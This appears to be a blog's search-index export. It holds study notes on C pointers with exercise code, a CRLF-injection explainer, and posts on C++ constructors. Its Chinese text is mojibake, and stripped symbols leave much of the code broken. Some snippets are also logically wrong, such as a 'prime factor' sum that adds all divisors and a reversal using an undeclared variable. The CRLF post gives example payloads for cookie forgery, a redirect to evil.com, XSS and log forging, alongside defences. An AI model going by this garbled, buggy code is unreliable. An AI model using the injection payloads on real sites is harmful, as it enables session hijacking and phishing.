å®šä¹‰ï¼šç±»å‹å * æŒ‡é’ˆå˜é‡å â€‹\tint* point; â€‹\tpoint=a;\\ \\ç­‰ä»·äºint* point=a; å‡½æ•°è°ƒç”¨æ—¶ä¸åŠ * e.g swap(point_1,point_2); ä¸ºä½¿åœ¨å‡½æ•°ä¸­æ”¹å˜çš„å˜é‡èƒ½è¢«mainæ‰€ç”¨ï¼Œåº”è¯¥ç”¨æŒ‡é’ˆå˜é‡åšå‡½æ•°å‚æ•° e.g void swap(int *p1,int *p2) int temp; temp=*p1; *p1=*p2; *p2=temp; é€šè¿‡æŒ‡é’ˆå¼•ç”¨æ•°ç»„ ä¸€ç»´æ•°ç»„ int *p;p=a[0];\\\\ä¸èƒ½å†™æˆ*p=a[0]; p=a[0];p=a;\\\\pçš„å€¼æ˜¯æ•°ç»„açš„é¦–å…ƒç´  å¦‚æœæŒ‡é’ˆå…ƒç´ pæŒ‡å‘æ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™p+1æŒ‡å‘åŒä¸€æ•°ç»„çš„ä¸‹ä¸ªå…ƒç´ ï¼Œp-1æŒ‡å‘åŒä¸€æ•°ç»„çš„ä¸Šä¸ªå…ƒç´  å¦‚æœpçš„åˆå€¼ä¸ºa[0]ï¼Œåˆ™p+i/a+iå³a[i]çš„åœ°å€ï¼Œ*(p+i)/ *(a+i)æ˜¯p+i/a+iæ‰€æŒ‡å‘çš„æ•°ç»„å…ƒç´ å³a[i] ä¸¤ä¸ªåœ°å€ä¸èƒ½ç›¸åŠ  è‹¥æŒ‡é’ˆå˜é‡p1ã€p2éƒ½æŒ‡å‘åŒä¸€æ•°ç»„ä¸­çš„å…ƒç´ ï¼Œp2-p1ç»“æœä¸º(p2-p1)çš„å€¼ï¼ˆåœ°å€ä¹‹å·®ï¼‰ int i,a[10];int* p=a;\\\\påˆå€¼æ˜¯aï¼ŒpæŒ‡å‘a[0]for(i=0;i10;i++)scanf(%d,p++);p=a;\\\\é‡æ–°ä½¿pæŒ‡å‘a[0]for(i=0;i10;i++,p++)printf(%d,*p); è‹¥a[0]=3ï¼Œ++(*p) =a[0]=4 fun(int arr[],int n) = fun(int* arr,int n) äºŒç»´æ•°ç»„ *(a[i]+j)æˆ– *(*(a+i)+j)æ˜¯a[i][j]çš„å€¼ å¯¹äºaæ˜¯äºŒç»´æ•°ç»„ï¼Œåˆ™a[i]æ˜¯ä¸€ä½æ•°ç»„åï¼Œä»–æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå¹¶ä¸ä»£è¡¨ä¸€ä¸ªå‚¨å­˜å•å…ƒ/å…¶ä¸­çš„å€¼ int (*p)[4]å®šä¹‰åŒ…å«4ä¸ªå…ƒç´ çš„ä¸€ç»´æ•°ç»„çš„æŒ‡é’ˆå˜é‡ e.g æœ‰ä¸€ä¸ªäºŒç»´æ•°ç»„int arr[3][4]ï¼Œå¯ç”¨int (*p)[4]æ¥å£°æ˜ä¸€ä¸ªæŒ‡é’ˆpæŒ‡å‘è¿™ä¸ªäºŒç»´æ•°ç»„æŸä¸€è¡Œ int arr[3][4]=0,1,2,3,4,5,6,7,8,9,10,11;int (*p)[4]=arr[0];\\\\pæŒ‡å‘arræŸä¸€è¡Œ é€šè¿‡æŒ‡é’ˆå¼•ç”¨å­—ç¬¦ä¸² é€šè¿‡å­—ç¬¦æ•°ç»„å/å­—ç¬¦æŒ‡é’ˆå˜é‡å¯ä»¥è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸² char* a,str[10];a=str;scanf(%s,a); æ•°ç»„åè™½ä»£è¡¨åœ°å€ï¼Œä½†å®ƒæ˜¯å¸¸é‡ï¼Œå…¶å€¼ä¸å¯æ”¹å˜ å­—ç¬¦æŒ‡é’ˆå˜é‡æŒ‡å‘çš„å­—ç¬¦ä¸²å¸¸é‡ä¸­çš„å†…å®¹æ˜¯ä¸å¯è¢«å–ä»£ æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ å‡½æ•°åæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ˆåœ°å€ï¼‰ int (*p)(int,int)p=max;\\\\å°†å‡½æ•°å…¥å£åœ°å€èµ‹ç»™pc=(*p)(a,b);\\\\ç”¨*pä»£æ›¿å‡½æ•°å char* p[6]åŒ…å«6ä¸ªæŒ‡é’ˆçš„æ•°å€¼ ç”¨æˆ·è‡ªå·±å»ºç«‹æ•°æ®ç±»å‹ ç»“æ„ä½“ struct ç»“æ„ä½“å{ â€‹\tæˆå‘˜è¡¨åˆ—ï¼ˆç±»å‹å æˆå‘˜åï¼‰; }; å¼•ç”¨ç»“æ„ä½“å˜é‡ä¸­æˆå‘˜çš„å€¼ï¼šç»“æ„ä½“å˜é‡å.æˆå‘˜å e.gstudent1.num=10010; ä¸èƒ½é€šè¿‡è¾“å‡ºç»“æ„ä½“å˜é‡åæ¥è¾¾åˆ°è¾“å‡ºç»“æ„ä½“å˜é‡æ‰€æœ‰æˆå‘˜çš„å€¼ è‹¥pæŒ‡å‘ä¸€ä¸ªç»“æ„ä½“å˜é‡stu åˆ™ stu.num = (*p).num = p-num ç»“æ„ä½“æ•°ç»„è¯»å…¥ä¸ç”¨åŠ  å…±ç”¨ä½“ union å…±ç”¨ä½“å{ â€‹\tæˆå‘˜è¡¨åˆ—ï¼ˆç±»å‹å æˆå‘˜åï¼‰; }; typedefå£°æ˜æ–°ç±»å‹å Cè¯­è¨€ç»å…¸ä¾‹é¢˜ ç»Ÿè®¡ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ¯ä¸ªå•è¯çš„å­—ç¬¦æ•° #includestdio.hint main() char c; int count=0;\\\\ç”¨äºç»Ÿè®¡å½“å‰å•è¯çš„å­—ç¬¦æ•° int first=1;\\\\ç”¨äºæ ‡è®°æ˜¯å¦æ˜¯ç¬¬ä¸€ä¸ªè¾“å‡ºçš„å­—ç¬¦æ•°ï¼Œåˆå§‹å€¼ä¸º1ï¼Œè¡¨ç¤ºæ˜¯ç¬¬ä¸€ä¸ª while(scanf(%c,c)c!=.) if(c== )\\\\å¦‚æœè¯»å–åˆ°çš„å­—ç¬¦æ˜¯ç©ºæ ¼ï¼Œè¯´æ˜å½“å‰å•è¯ç»“æŸ if(count0)\\\\å¦‚æœcountå¤§äº0ï¼Œè¯´æ˜å‰é¢æœ‰å•è¯å­—ç¬¦è¢«ç»Ÿè®¡ if(!first)printf( );\\\\å¦‚æœfirstä¸º0ï¼ˆå³ä¸æ˜¯ç¬¬ä¸€ä¸ªè¾“å‡ºï¼‰ï¼Œåˆ™å…ˆè¾“å‡ºä¸€ä¸ªç©ºæ ¼ä½œä¸ºåˆ†éš” printf(%d,count); first=0; count=0;\\\\é‡ç½®countä¸º0ï¼Œå‡†å¤‡ç»Ÿè®¡ä¸‹ä¸€ä¸ªå•è¯ else count++;\\\\å¦‚æœè¯»å–åˆ°çš„å­—ç¬¦ä¸æ˜¯ç©ºæ ¼ï¼Œåˆ™countåŠ 1ï¼Œç»§ç»­ç»Ÿè®¡å½“å‰å•è¯çš„å­—ç¬¦æ•° if(count0)\\\\å¾ªç¯ç»“æŸåï¼Œå¦‚æœcountå¤§äº0ï¼Œè¯´æ˜æœ€åä¸€ä¸ªå•è¯çš„å­—ç¬¦æ•°è¿˜æ²¡æœ‰è¾“å‡º if(!first)printf( );\\\\å¦‚æœä¸æ˜¯ç¬¬ä¸€ä¸ªè¾“å‡ºï¼Œå…ˆè¾“å‡ºä¸€ä¸ªç©ºæ ¼ printf(%d,count);\\\\è¾“å‡ºæœ€åä¸€ä¸ªå•è¯çš„å­—ç¬¦æ•° ç»Ÿè®¡3ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰¾å‡ºå…¶ä¸­æœ€å¤§å€¼ #includestdio.h#includestring.hint main() char str [3] [20]; char string[20]; for(int i=0;i3;i++) gets(str[i]); for(int i=0;i2;i++) if(strcmp(str[i],str[i+1])0)strcpy(string,str[i]); if(strcmp(str[i],str[i+1])=0)strcpy(string,str[i+1]); printf(%s,string); å­—ç¬¦ä¸²çš„å¤åˆ¶ï¼ˆæŒ‡é’ˆï¼‰ void copy_string(char* from,char* to) while((*to=*from)!=\\0) to++; from++; void copy_string(char* from,char* to) while((*to++=*from++)!=\\0); void copy_string(char* from,char* to) while(*from!=\\0) *to++=*from++; *to=\\0; é€‰æ‹©æ’åº void selectSort(int arr[],int n) int i,j,minIndex,temp; for(i=0;in-1;i++) //å¤–å±‚å¾ªç¯æ§åˆ¶æ’åºè¶Ÿæ•° minIndex=i; //å‡è®¾å½“å‰ä½ç½®å…ƒç´ å°±æ˜¯æœ€å°å€¼ for (j=i+1;jn;j++) //å†…å±‚å¾ªç¯åœ¨å‰©ä½™å…ƒç´ ä¸­æ‰¾æœ€å°å€¼ if(arr[j]arr[minIndex])minIndex=j; //æ›´æ–°æœ€å°å€¼ç´¢å¼• if(minIndex!=i) //å¦‚æœæ‰¾åˆ°æ›´å°çš„å…ƒç´ ï¼Œè¿›è¡Œäº¤æ¢ temp=arr[i]; arr[i]=arr[minIndex]; arr[minIndex]=temp; äººæ•°è¿‡åŠ è¾“å…¥Nä¸ªæ•°ï¼Œæ±‚å‡ºç°æ¬¡æ•°è¶…è¿‡æ€»æ•°ä¸€åŠçš„æ•°ã€‚æ•°æ®ä¿è¯å­˜åœ¨è¿™ä¸ªæ•°ã€‚ è¾“å…¥æ ¼å¼: ç¬¬ä¸€è¡Œè¾“å…¥ä¸€ä¸ªæ­£æ•´æ•°N(N1000)ï¼› ç¬¬äºŒè¡Œè¾“å…¥Nä¸ªæ•°ï¼Œæ¯ä¸ªæ•°çš„ç»å¯¹å€¼ä¸è¶…è¿‡1e9ã€‚ è¾“å‡ºæ ¼å¼: è¾“å‡ºä¸€ä¸ªæ•°ï¼Œå³å‡ºç°æ¬¡æ•°è¶…è¿‡æ€»æ•°ä¸€åŠçš„æ•°ã€‚ #includestdio.hint main() int n; scanf(%d,n); int a[2000]; for(int i=0;in;i++) scanf(%d,a[i]); int can=a[0]; int cnt=1; for(int i=0;in;i++) if(cnt==0) can=a[i]; cnt=1; else if(can==a[i])cnt++; else cnt--; printf(%d,can); nä¸ªæ•°å­—ä¸­é€‰å‡ºæ•°å­—å’Œæœ€å¤§çš„è¿ç»­ä¸€æ®µ int sum1=0,sum=-1000; for(int i=0;in;i++) sum1=(sum1+a[i])a[i]?(sum1+a[i]):a[i]; if(sum1sum)sum=sum1; printf(%d,sum); ç»“å°¾ä¸è¾“å‡ºç©ºè¡Œ int flag=1;Â·Â·Â·if(!flag)printf( );flag=0;Â·Â·Â·\\\\è¾“å‡ºÂ·Â·Â· æ•°ç»„å…ƒç´ å³ç§» nä¸ªæ•°ï¼Œç¬¬iä¸ªæ•°å‘å³ç§»mä¸ªæ•´æ•°å˜ä¸ºa[(i+n-m)%n] å•è¯ç¿»è½¬ #includestdio.h#includestring.hchar* r(char* s) int len=strlen(s); for(int i=0;ilen/2;i++) char t=s[i]; s[i]=s[len-1-i]; s[len-1-i]=t; return s;int main() char s[25]; while(scanf(%s,s)!=EOF) \\\\å»é™¤å¤šä½™ç©ºæ ¼ printf(%s,r(s)); 10è¿›åˆ¶æ•°nè½¬åŒ–æˆmè¿›åˆ¶ int cnt=1,sum=0;while(n0) t=n%m; t*=cnt; sum+=t; n/=m; cnt*=10; æ±‚nçš„ç´ æ•°å› å­å’Œ for(int i=1;isqrt(n);i++) if(n%i==0) sum+=i; if(n/i!=i) sum+=n/i; æ±‚aï¼Œbçš„æœ€å¤§å…¬çº¦æ•° m=a;n=b;while(n!=0) t=m%n; m=n; n=t;\\\\må³ä¸ºæœ€å¤§å…¬çº¦æ•° å°†ä¸€ä¸ªnä½æ•°åè½¬ int number,res=0,rem;scanf(%d,number);while(number!=0) rem=num%10; res=res*10+rem; number/=10; æ¨è¾‰ä¸‰è§’ #includestdio.hint main() int rows,conf=1; scanf(%d,rows); for(int i=0;irows;i++) for(int space=1;space=rows-i-1;space++) printf( ); for(int j=0;j=i;j++) if(j==0||i==0)conf=1; else conf=conf*(i-j+1)/j; printf(%4d ,conf); printf( );","tags":["ç¼–ç¨‹"],"categories":["ç¼–ç¨‹"]},{"title":"CRLFæ¼æ´","path":"/2025/07/09/CRLFæ¼æ´/","content":"CRLFæ¼æ´ CRLFï¼ˆCarriage Return + Line Feedï¼Œå›è½¦ + æ¢è¡Œï¼‰ï¼Œæ˜¯ \\r çš„ç»„åˆï¼Œè¡¨ç¤ºæ–‡æœ¬æ¢è¡Œ \\r è¿›è¡ŒURLç¼–ç å˜æˆ%0D%0A CRLFæ³¨å…¥ åœ¨è¾“å…¥ä¸­æ’å…¥ \\r ï¼Œæ”¹å˜ HTTP å¤´éƒ¨æˆ– HTML é¡µé¢ç»“æ„ï¼Œè¿›è€Œå®ç° XSSã€HTTP å“åº”æ‹†åˆ†ï¼ˆHTTP Response Splittingï¼‰ã€Web ä¼ªé€ æ”»å‡» HTTPå“åº”æ‹†åˆ† åŸç† æœåŠ¡å™¨åœ¨å“åº” HTTP å¤´æ—¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨ \\r ä½œä¸ºåˆ†éš”ç¬¦ å¦‚æœæ”»å‡»è€…å¯ä»¥åœ¨ URL æˆ–è¯·æ±‚å¤´ä¸­æ³¨å…¥ \\r ï¼Œå°±å¯èƒ½ ä¼ªé€  HTTP å¤´éƒ¨æˆ–æ’å…¥æ¶æ„å†…å®¹ ç¤ºä¾‹ HTTP/1.1 200 OKContent-Type: text/htmlSet-Cookie: user=adminhtmlbodyWelcome/body/html æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼š https://example.com/page?param=%0D%0ASet-Cookie:%20admin=true æœåŠ¡å™¨è¿”å›ï¼š HTTP/1.1 200 OKContent-Type: text/htmlSet-Cookie: user=adminSet-Cookie: admin=true -- æ”»å‡»è€…æˆåŠŸä¼ªé€  CookiehtmlbodyWelcome/body/html æ”»å‡»è€…æˆåŠŸä¼ªé€ cookieï¼Œå¯èƒ½ç»•è¿‡èº«ä»½éªŒè¯ï¼Œå¯ä»¥ç”¨äºä¼šè¯åŠ«æŒã€é’“é±¼æ”»å‡»ç­‰ å…¶å¯ä¸locationå¤´ç»“åˆè¿›è¡Œé‡å®šå‘ https://example.com/page?username=%0D%0ALocation:%20https://evil.com%0D%0A å¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¿”å›ï¼š HTTP/1.1 200 OKContent-Type: text/htmlSet-Cookie: user=Location: https://evil.com -- ä¼ªé€ é‡å®šå‘htmlbodyWelcome!/body/html ç”¨æˆ·è¢«æ¶æ„è·³è½¬åˆ°evil.com CRLFä¸XSSç»“åˆ æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼š https://example.com/page?param=%0D%0AContent-Length:%200%0D%0A%0D%0Ascriptalert(XSS)/script æœåŠ¡å™¨è¿”å›ï¼š HTTP/1.1 200 OKContent-Type: text/htmlContent-Length: 0 -- ä¼ªé€ çš„ Content-Length scriptalert(XSS)/script -- XSS ä»£ç è¢«æ‰§è¡Œ CRLF é€ æˆæ—¥å¿—ä¼ªé€  å¾ˆå¤š Web æœåŠ¡å™¨ä¼šå°†è¯·æ±‚å‚æ•°å†™å…¥æ—¥å¿—ï¼Œä¾‹å¦‚ï¼š [INFO] 2025-02-07 12:00:00 - User input: test å¦‚æœæ”»å‡»è€…è¾“å…¥ \\r ï¼Œå¯èƒ½ä¼ªé€ æ—¥å¿—å†…å®¹ï¼š https://example.com/page?param=%0D%0A%5BWARNING%5D%20Security%20Breach! æœåŠ¡å™¨æ—¥å¿—å¯èƒ½å˜æˆï¼š [INFO] 2025-02-07 12:00:00 - User input: [WARNING] Security Breach! æ”»å‡»è€…å¯ä»¥ä¼ªé€ ç³»ç»Ÿæ—¥å¿—ï¼Œå¯èƒ½éšè—æ”»å‡»ç—•è¿¹ã€åˆ¶é€ å‡è­¦æŠ¥ç­‰ é˜²å¾¡ CRLF æ³¨å…¥ è¿‡æ»¤ç”¨æˆ·è¾“å…¥ï¼Œç§»é™¤ \\r userInput = userInput.replace(/[\\r ]/g, ); // åˆ é™¤ CRLF å¯¹ URL å‚æ•°è¿›è¡Œç¼–ç  encodeURIComponent(userInput); è®¾ç½® HTTP å¤´å®‰å…¨ç­–ç•¥ å¯ç”¨ CSP ï¼Œåªå…è®¸åŒæºï¼ˆselfï¼‰èµ„æºåŠ è½½ï¼ˆå†…åµŒ HTMLï¼ˆé JS æˆ– CSSï¼‰ï¼‰ï¼Œé˜»æ­¢å¤–éƒ¨èµ„æºåŠ è½½ Content-Security-Policy: default-src self HTTP å¤´ä¸­ä½¿ç”¨å®‰å…¨ API åœ¨ setHeader() æ—¶é¿å…æ‹¼æ¥ç”¨æˆ·è¾“å…¥ï¼š res.setHeader(Set-Cookie, `user=$encodeURIComponent(username)`); ç¡®ä¿æ—¥å¿—å®‰å…¨ ä½¿ç”¨ JSON.stringify() è®°å½•æ—¥å¿—ï¼Œé˜²æ­¢æ¢è¡Œ é¿å…ç›´æ¥å†™å…¥ç”¨æˆ·è¾“å…¥","tags":["CRLF","æ¼æ´"],"categories":["æ¼æ´"]},{"title":"C++ä¸­çš„è½¬æ¢æ„é€ å‡½æ•°ä¸ç±»å‹è½¬æ¢è¿ç®—ç¬¦","path":"/2025/07/09/C++ä¸­çš„è½¬æ¢æ„é€ å‡½æ•°ä¸ç±»å‹è½¬æ¢è¿ç®—ç¬¦/","content":"C++ä¸­çš„è½¬æ¢æ„é€ å‡½æ•°ä¸ç±»å‹è½¬æ¢è¿ç®—ç¬¦ éšå¼ç±»å‹è½¬æ¢ C++çš„å†…ç½®ç±»å‹ä¹‹é—´ä¼šè¿›è¡Œéšå¼çš„ç±»å‹è½¬æ¢ charã€shortã€intã€longå››ä¸ªç±»å‹æ··åˆè¿ç®—æ—¶ï¼Œè¾ƒå°çš„(å ç”¨å­—èŠ‚æ•°å°)æ•´æ•°ç±»å‹ä¼šè¢«è‡ªåŠ¨æå‡ä¸ºè¾ƒå¤§çš„(å ç”¨å­—èŠ‚æ•°å¤§)æ•´æ•°ç±»å‹ï¼Œä»¥ç¡®ä¿ä¸ä¼šä¸¢å¤±ç²¾åº¦ signedç±»å‹å’Œunsignedç±»å‹æ··åˆè¿ç®—çš„ç»“æœæ˜¯unsignedç±»å‹ æ•´å‹(charã€shortã€intã€long)å’Œæµ®ç‚¹ç±»å‹(floatã€double)æ··åˆè¿ç®—æ—¶ï¼Œä¼šè‡ªåŠ¨æå‡ä¸ºæµ®ç‚¹ç±»å‹ï¼›è¾ƒçŸ­çš„æµ®ç‚¹æ•°ç±»å‹ï¼ˆå¦‚floatï¼‰ä¼šè¢«è‡ªåŠ¨æå‡ä¸ºæ›´é•¿çš„æµ®ç‚¹æ•°ç±»å‹ï¼ˆå¦‚doubleï¼‰ä»¥è¿›è¡Œæ··åˆè¿ç®—ï¼Œä»¥ç¡®ä¿ä¸ä¼šä¸¢å¤±ç²¾åº¦ è‡ªå®šä¹‰çš„ç±»ç±»å‹è½¬æ¢ C++æä¾›è½¬æ¢æ„é€ å‡½æ•°ã€ç±»å‹è½¬æ¢è¿ç®—ç¬¦å‡½æ•°è¿™ä¸¤ç§æˆå‘˜å‡½æ•°æ¥æ”¯æŒç±»ç±»å‹çš„ç±»å‹è½¬æ¢ è½¬æ¢æ„é€ å‡½æ•° å°†å…¶ä»–ç±»å‹çš„å¯¹è±¡è½¬æ¢ä¸ºæœ¬ç±»å¯¹è±¡ ç‰¹ç‚¹ å±äºæ„é€ å‡½æ•°çš„ä¸€ç§ï¼Œæ²¡æœ‰è¿”å›å€¼ï¼Œå‡½æ•°åå’Œç±»åä¸€æ · åªæœ‰ä¸€ä¸ªå½¢å‚ï¼Œæˆ–å…¶ä»–å½¢å‚éƒ½æœ‰é»˜è®¤å€¼ å½¢å‚ç±»å‹å¯ä»¥æ˜¯å†…ç½®ç±»å‹ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç±»ç±»å‹ å¯ä»¥ä½¿ç”¨å…³é”®å­— explicit é™åˆ¶éšå¼è½¬æ¢ ä½¿ç”¨ class MyClass public: MyClass(int x) // å°† int è½¬æ¢ä¸º MyClass ; ç±»å‹è½¬æ¢è¿ç®—ç¬¦å‡½æ•° å°†ç±»å¯¹è±¡è½¬æ¢ä¸ºå…¶ä»–ç±»å‹å¯¹è±¡ ç‰¹ç‚¹ å‡½æ•°åŸå‹æ²¡æœ‰è¿”å›å€¼ã€æ²¡æœ‰å‚æ•° å‡½æ•°åä¸ºå…³é”®å­—operator ç±»å‹ï¼ˆç±»å‹ä¸ºè¦è½¬æ¢çš„ç±»å‹ï¼‰ å¿…é¡»è¦æœ‰returnè¯­å¥ï¼Œreturnçš„ç±»å‹å°±æ˜¯è¦è½¬æ¢ä¸ºçš„ç±»å‹ è½¬æ¢ä¸ºçš„ç±»å‹å¯ä»¥æ˜¯å†…ç½®ç±»å‹ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç±»ç±»å‹ ä½¿ç”¨ class MyClass int value;public: MyClass(int v) : value(v) // ç±»å‹è½¬æ¢å‡½æ•° operator int() const return value; ;","tags":["ç¼–ç¨‹"],"categories":["ç¼–ç¨‹"]},{"title":"C++ä¸­çš„æ‹·è´æ„é€ å‡½æ•°ã€æµ…æ‹·è´ä¸æ·±æ‹·è´","path":"/2025/07/09/C++ä¸­çš„æ‹·è´æ„é€ å‡½æ•°ã€æµ…æ‹·è´ä¸æ·±æ‹·è´/","content":"C++ä¸­çš„æ‹·è´æ„é€ å‡½æ•°ã€æµ…æ‹·è´ä¸æ·±æ‹·è´ æ‹·è´/å¤åˆ¶æ„é€ å‡½æ•° C++ä¸­ä¸¤ç§åˆå§‹åŒ–çš„åŒºåˆ« 1.å¯¹äºåŸºæœ¬ç±»å‹æ²¡æœ‰åŒºåˆ« æ‹·è´åˆå§‹åŒ– int a=5; ç›´æ¥åˆå§‹åŒ– int a(5) 2.å¯¹äºç±»ç±»å‹ ç›´æ¥åˆå§‹åŒ–ç›´æ¥è°ƒç”¨å®å‚åŒ¹é…çš„æ„é€ å‡½æ•° ä¾‹å¦‚: A x(2);//ç›´æ¥åˆå§‹åŒ–ï¼Œè°ƒç”¨æ„é€ å‡½æ•° æ‹·è´åˆå§‹åŒ–æ€»æ˜¯è°ƒç”¨æ‹·è´æ„é€ å‡½æ•° A y=x;//æ‹·è´åˆå§‹åŒ–ï¼Œè°ƒç”¨æ‹·è´æ„é€ å‡½æ•°ï¼Œ åŸºæœ¬æ¦‚å¿µ æ‹·è´æ„é€ å‡½æ•°ï¼ˆCopy Constructorï¼‰æ˜¯æ„é€ å‡½æ•°çš„ä¸€ç§ï¼Œç”¨äº åˆ›å»ºæ–°å¯¹è±¡æ—¶ï¼Œç”¨å·²æœ‰å¯¹è±¡æ¥åˆå§‹åŒ–å®ƒï¼Œå¦‚æœæ²¡æœ‰å®šä¹‰å¤åˆ¶æ„é€ å‡½æ•°ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°ã€‚é»˜è®¤çš„å¤åˆ¶æ„é€ å‡½æ•°å®Œæˆå¤åˆ¶åŠŸèƒ½ ClassName(const ClassName other); åŠ constå¥½å¤„ é˜²æ­¢è¯¯æ“ä½œå°†åŸå¯¹è±¡å†…å®¹ä¿®æ”¹ é˜²æ­¢ä¼ å…¥constå¯¹è±¡é€ æˆã€æƒé™æ”¾å¤§ã€‘ ä½¿ç”¨æ¡ä»¶ ä½¿ç”¨åŒç±»å‹çš„å¯¹è±¡å»åˆå§‹åŒ–å¦ä¸€ä¸ªå¯¹è±¡æ—¶ CDate date_1(2025,04,06);CDate date_2 = date_1; // è°ƒç”¨date_2çš„æ‹·è´æ„é€ å‡½æ•° å°†ä¸€ä¸ªå¯¹è±¡ä½œä¸ºå®å‚ä¼ é€’ç»™ä¸€ä¸ªéå¼•ç”¨ç±»å‹çš„å½¢å‚ void printDate(CDate date) date.show();...printDate(date_2); // å®å‚ä¼ å€¼åˆ°å½¢å‚ï¼Œè°ƒç”¨æ‹·è´æ„é€ å‡½æ•° ä»ä¸€ä¸ªè¿”å†‹ç±»å‹ä¸ºéå¼•ç”¨ç±»å‹çš„å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ CDate g_date(2025,04,06);CDate getDate() return g_date;\t// è¿”å›å¯¹è±¡æ—¶ï¼Œè°ƒç”¨æ‹·è´æ„é€ å‡½æ•° å®ä¾‹ï¼š // g++ 11_Copy_Constructor_Date.cpp#include iostream#include stdio.husing namespace std;class CDatepublic: CDate(int year, int mon, int day);\t// æ„é€ å‡½æ•°å£°æ˜ CDate(const CDate date); // æ‹·è´æ„é€ å‡½æ•°å£°æ˜ ~CDate(); // ææ„å‡½æ•°å£°æ˜ void show() //cout Date: m_year . m_mon . m_day endl; cout Date: str endl; private: int m_year; int m_mon; int m_day; char *str;;// æ„é€ å‡½æ•°å®šä¹‰CDate::CDate(int year, int mon, int day) m_year = year; m_mon = mon; m_day = day; str = new char[64]; sprintf(str, %4d.%02d.%02d, year,mon,day); cout Calling Constructor , this= this endl;// æ‹·è´æ„é€ å‡½æ•°å®šä¹‰CDate::CDate(const CDate date) m_year = date.m_year; m_mon = date.m_mon; m_day = date.m_day; str = new char[64]; sprintf(str, %4d.%02d.%02d, m_year,m_mon,m_day); cout Calling Copy Constructor , this= this endl;// ææ„å‡½æ•°å®šä¹‰CDate::~CDate() cout Calling Destructor , this= this endl; delete [] str;void printDate(CDate date) date.show();CDate g_date(2025,04,06);;CDate getDate() return g_date;\t// 3ã€è¿”å›å¯¹è±¡æ—¶ï¼Œè°ƒç”¨æ‹·è´æ„é€ å‡½æ•°int main() CDate date_1(2025,04,05); CDate date_2 = date_1;\t// 1ã€è°ƒç”¨date_2çš„æ‹·è´æ„é€ å‡½æ•° date_1.show(); date_2.show(); cout endl; printDate(date_2);\t// 2ã€å®å‚ä¼ å€¼åˆ°å½¢å‚ï¼Œè°ƒç”¨æ‹·è´æ„é€ å‡½æ•° cout endl; getDate(); cout endl; return 0; è¾“å‡ºï¼š Calling Constructor, this=0x4a8030 //g_dateçš„æ„é€ å‡½æ•°Calling Constructor, this=0x6ffdb0 //date_1çš„æ„é€ å‡½æ•°Calling Copy Constructor, this=0x6ffd90 //date_2çš„æ‹·è´æ„é€ å‡½æ•°Date: 2024.06.05Date: 2024.06.05Calling Copy Constructor, this=0x6ffdd0 //å½¢å‚çš„æ‹·è´æ„é€ å‡½æ•°Date: 2024.06.05Calling Destructor, this=0x6ffdd0Calling Copy Constructor, this=0x6ffdf0 //è¿”å›å€¼çš„æ‹·è´æ„é€ å‡½æ•°Calling Destructor, this=0x6ffdf0Calling Destructor, this=0x6ffd90Calling Destructor, this=0x6ffdb0Calling Destructor, this=0x4a8030 ä¼ å€¼è°ƒç”¨å’Œä¼ å¼•ç”¨è°ƒç”¨ åœ¨ä¼  â€œå€¼â€ è°ƒç”¨çš„æ—¶å€™ï¼Œ å½¢å‚æ˜¯å®å‚çš„æ‹·è´ï¼Œæ”¹å˜å½¢å‚çš„å€¼å¹¶ä¸ä¼šå½±å“å¤–éƒ¨å®å‚çš„å€¼ã€‚ åœ¨ä¼  â€œå¼•ç”¨â€ è°ƒç”¨çš„æ—¶å€™ï¼Œå½¢å‚æ˜¯å®å‚çš„åˆ«åï¼Œå…±åŒæ‹¥æœ‰ä¸€ä¸ªåœ°å€ï¼Œæ”¹å˜å½¢å‚çš„å€¼ï¼Œå°±ç›¸å½“äºå¯¹å®å‚æœ¬èº«è¿›è¡Œæ“ä½œã€‚ ä¸¤è€…ä¹‹é—´çš„åŒºåˆ«ï¼šä¼  â€œå€¼â€ è°ƒç”¨ä¼šæ¯”ä¼  â€œå¼•ç”¨â€ è°ƒç”¨ ä¸­é—´å¤šä¸€æ­¥æ‹·è´çš„æ“ä½œ class Datepublic: // æ„é€ å‡½æ•° // é€šå¸¸éƒ½ä¼šå…ˆè¿è¡Œæ„é€ å‡½æ•°å†è¿è¡ŒInit Date(int year = 2025,int month = 4,int day = 6) _year = 2025; _month = 4; _day = 6; //æ‹·è´æ„é€ å‡½æ•° Date(const Date d) cout è°ƒç”¨æ‹·è´æ„é€  endl; _year = d._year; _month = d._month; _day = d._day; void Print() std::cout year: _year std::endl; std::cout month: _year std::endl; std::cout day: _year std::endl; // ææ„å‡½æ•° ~Date() cout è°ƒç”¨ææ„æ„é€  endl; cout endl; _year = 0; _month = 0; _day = 0; private: int _year; int _month; int _day;;// ä¼ å€¼è°ƒç”¨void Func1(Date d1) cout Func1å‡½æ•°çš„è°ƒç”¨ endl;// ä¼ å¼•ç”¨å¸¦å“¦ç”¨void Func2(Date d2) cout Func2å‡½æ•°çš„è°ƒç”¨ endl; int main() Date d; Func1(d); Func2(d); return 0; è¾“å‡ºï¼š è°ƒç”¨æ‹·è´æ„é€ Func1å‡½æ•°çš„è°ƒç”¨è°ƒç”¨ææ„æ„é€ Func2å‡½æ•°çš„è°ƒç”¨è°ƒç”¨ææ„æ„é€  æµ…æ‹·è´ æµ…æ‹·è´ = é»˜è®¤æ‹·è´è¡Œä¸ºï¼Œç¼–è¯‘å™¨ä¸ºä½ ç”Ÿæˆçš„æ‹·è´æ„é€ å‡½æ•°ä¼šåšæˆå‘˜é€ä¸ªå­—èŠ‚æ‹·è´ å¤§ç™½è¯ï¼šåªæ˜¯å¢åŠ ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å·²ç»å­˜åœ¨çš„å†…å­˜åœ°å€ ç»“æ„ç®€å•ã€æ— åŠ¨æ€å†…å­˜ï¼ˆå¦‚intã€floatï¼‰ 